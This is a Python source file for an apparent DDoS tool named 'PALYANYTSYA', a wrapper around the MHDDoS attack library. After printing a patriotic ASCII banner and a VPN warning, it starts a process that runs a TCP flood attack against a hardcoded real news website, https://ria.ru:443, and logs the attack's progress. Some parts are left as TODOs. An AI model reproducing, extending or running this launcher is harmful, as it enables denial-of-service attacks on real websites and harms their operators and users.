import logging
import time
from multiprocessing import Process, Queue
from queue import Empty
from typing import List

import colorama
import psutil
from humanfriendly.terminal import *

from MHDDoS.start import attack, AttackState
from MHDDoS.utils.targets import Target
from utils.misc import print_vpn_warning, supports_complex_colors

logger = logging.getLogger("PALYANYTSYA")


def get_flair_string():
    BLUE = (0, 91, 187) if supports_complex_colors() else "blue"
    YELLOW = (255, 213, 0) if supports_complex_colors() else "yellow"
    GREEN = (8, 255, 8) if supports_complex_colors() else "green"
    RED = (255, 0, 0) if supports_complex_colors() else "red"

    heart = ansi_wrap("♥", color=RED)

    flair_string = "\n" + \
                   "A heavy-duty freedom-infused MHDDoS wrapper...\n" + \
                   "\n" + \
                   ansi_wrap("██████╗░░█████╗░██╗░░░░░██╗░░░██╗░█████╗░███╗░░██╗██╗░░░██╗████████╗░██████╗██╗░░░██╗░█████╗░\n", color=BLUE) + \
                   ansi_wrap("██╔══██╗██╔══██╗██║░░░░░╚██╗░██╔╝██╔══██╗████╗░██║╚██╗░██╔╝╚══██╔══╝██╔════╝╚██╗░██╔╝██╔══██╗\n", color=BLUE) + \
                   ansi_wrap("██████╔╝███████║██║░░░░░░╚████╔╝░███████║██╔██╗██║░╚████╔╝░░░░██║░░░╚█████╗░░╚████╔╝░███████║\n", color=BLUE) + \
                   ansi_wrap("██╔═══╝░██╔══██║██║░░░░░░░╚██╔╝░░██╔══██║██║╚████║░░╚██╔╝░░░░░██║░░░░╚═══██╗░░╚██╔╝░░██╔══██║\n", color=YELLOW) + \
                   ansi_wrap("██║░░░░░██║░░██║███████╗░░░██║░░░██║░░██║██║░╚███║░░░██║░░░░░░██║░░░██████╔╝░░░██║░░░██║░░██║\n", color=YELLOW) + \
                   ansi_wrap("╚═╝░░░░░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░░░╚═╝░░░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝\n", color=YELLOW) + \
                   "\n" + \
                   f"                                                                  ...from Ukraine with love {heart}\n"
    return flair_string


def print_flair():
    print(get_flair_string())
    print(ansi_wrap("Initializing...\n", color="green"))


def velyka_kara():
    print_flair()
    print_vpn_warning()

    # TODO: read cmdargs
    # TODO: load targets
    # TODO: launch processes (one per target)
    # TODO: launch GUI loop

    # # override script name
    # argv[0] = "palyanytsya.py"
    #
    # if len(argv) < 5:
    #     print("Not enough arguments supplied. Please check the reference below:\n")
    #     argv.insert(1, "HELP")

    cpu_count = psutil.cpu_count()
    print(f"Host system has {cpu_count} CPUs available.")

    attack_processes: List[Process] = []

    state_queue = Queue()

    for _ in range(1):
        target = Target.parse_from_string("https://ria.ru:443")
        attack_method = "TCP"
        attack_process = Process(
            target=attack,
            args=(target, attack_method),
            kwargs={
                "proxies_file_path": None,
                "attack_state_queue": state_queue
            },
            daemon=True
        )
        attack_processes.append(attack_process)
        attack_process.start()

    while True:
        try:
            state_update: AttackState = state_queue.get_nowait()
            logger.warning(f" ------------------------> Received state update from PID{state_update.attack_pid}: {state_update}")
        except Empty:
            time.sleep(0.1)

    time.sleep(60)
    for attack_process in attack_processes:
        attack_process.kill()
    #
    # # enable debug to see attack progress
    # argv.append("true")
    #
    # start()


if __name__ == '__main__':
    colorama.init()

    try:
        velyka_kara()
    except KeyboardInterrupt:
        print("\nExecution aborted.\n")
    except SystemExit:
        pass

    colorama.deinit()

    input("\nExecution finished.\nPress ENTER to exit... ")
